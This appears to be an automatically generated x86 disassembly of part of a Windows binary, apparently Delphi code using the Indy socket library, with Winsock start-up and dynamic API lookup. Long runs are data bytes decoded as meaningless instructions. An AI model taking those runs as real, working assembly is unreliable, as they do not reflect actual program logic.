add al cl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] dh
inc edi
add [ ebp + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] bh
inc edi
add [ ebp + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] ah
inc edi
add [ ebp + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] ch
inc edi
add [ ebp + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] dl
inc edi
add [ ebp + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] bl
inc edi
add [ ebp + 0x550000fe ] bl
mov ebp esp
xor eax eax
push ebp
push sub_45f76d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f774
retn
sub_45f7f8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45f898
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403f4c
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403448
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40ae60
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_403f4c
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404278
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b668
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b668
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f89f
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f1c
retn
sub_45f89f
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_46067c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46071f
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460726
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408d28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f7f8
call sub_4038b0
sub_460730
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_460754
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_460821
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408d28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f7f8
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460828
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
sub_46085f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46088c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460893
retn
call sub_45f8d0
sub_4608a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4608cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4608d4
retn
sub_4608e0
sub al 0x9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx ] bh
inc esi
add [ eax + eax ] al
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ 0x53644954 ] cl
outsd
arpl [ ebx + 0x65 ] bp
add [ eax ] bh
adc al [ esi ]
push 0x68004029
sub [ eax ] eax
push 0x84004029
or al 0x46
add [ eax + 0x29 ] ch
imul esi [ ebx + 0x74 ] 0x998c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
or al [ esi ]
adc [ eax ] al
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
or al [ esi ]
or al 0x0
add [ eax ] al
cmp [ edx ] cl
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax * 2 + 0x74536449 ] bl
popad
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
arpl [ ebx - 0x70 ] bp
test [ edx ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0xc0046 ] al
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ 0x53644945 ] cl
je r-xdata
or eax 0x29680046
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] ch
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x68004029
sub [ eax ] eax
push 0x28004029
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax ] ch
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
cmp [ edx ] dl
inc esi
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ esp + ecx + 0x29680046 ] al
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x4c00408d
or eax [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
or eax [ esi ]
or al 0x0
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
add [ eax ] al
cmp [ edx ] cl
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] dl
inc ebp
dec ecx
push ebx
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx + 0x46 ] cl
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_460b70
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
shl al 0xa
sub_460b70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_460c24
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_460bb8
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_460c17
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460c1e
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_460c24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460c76
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f3d0
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460c7d
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_460cb0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_407d5c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_46115c
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_403f4c
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_403f4c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_460d28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_461122
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ef8
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408d28
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461129
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
jmp [ eax * 4 + jump_table_460d68 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
sub_461130
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_40800c
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_40800c
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_46115c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46121b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4628b8
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4628b8
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4628b8
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f90
mov eax [ ebp - 0x8 ]
call sub_461130
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_461130
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461222
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f1c
retn
mov eax [ ebp - 0x10 ]
call sub_461130
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_461130
test al al
jne r-xdata
mov bl 0x1
sub_461238
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_461268
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_4612b0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4612b7
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_4612c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4612e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4612ec
retn
sub_4612f8
inc esp
adc eax [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc eax [ esi ]
or [ ecx ] al
add [ eax ] al
loopne r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax + 0x22 ] dl
inc esi
add al ch
and [ esi ] eax
mov eax 0x4c004622
and al [ esi ]
adc al 0x54
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax ] dl
adc eax 0x1e140046
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
pop ss
inc esi
add [ edi + edx + 0x1bec0046 ] bl
inc esi
add ah dh
sbb al 0x46
add ah dl
sbb eax [ esi ]
sub [ eax ] bl
inc esi
add al ah
sbb eax [ esi ]
cld
sbb eax 0x1e080046
inc esi
add [ eax + ebx ] dh
inc esi
add [ eax + 0x18 ] dl
inc esi
add ah cl
sbb [ esi ] eax
in al 0x1a
inc esi
add [ eax ] al
sbb eax [ esi ]
insb
sbb eax [ esi ]
mov esp 0x7c00461b
and [ esi ] al
in al dx
and al [ esi ]
mov al 0x1b
inc esi
add [ eax + 0x28004620 ] cl
and [ esi ] eax
enter 0x4621 0x0
cmp [ 0x1fa00046 ] dl
inc esi
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
in al dx
inc esi
add [ esi + ebx + 0x1b8c0046 ] bh
inc esi
add [ esp + edx + 0x46 ] cl
add al ch
adc eax 0x16780046
inc esi
add ah ah
push ss
inc esi
add al dh
push ss
inc esi
add [ eax + 0x17 ] al
inc esi
add ah ch
lea eax [ eax ]
mov eax 0x4613
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx ] bh
inc esi
add [ eax ] dl
add [ eax ] al
add [ ecx + ecx + 0x46 ] cl
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc [ 0x1e140046 ] dl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4614ea
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_460c84
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4614f1
lea eax [ ebp - 0x194 ]
call sub_403ef8
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_460754
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_461510
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_461238
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_461538
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4615cc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_407e94
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_407e94
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_407e94
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_407e94
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_404278
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4615d3
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
sub_4615df
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
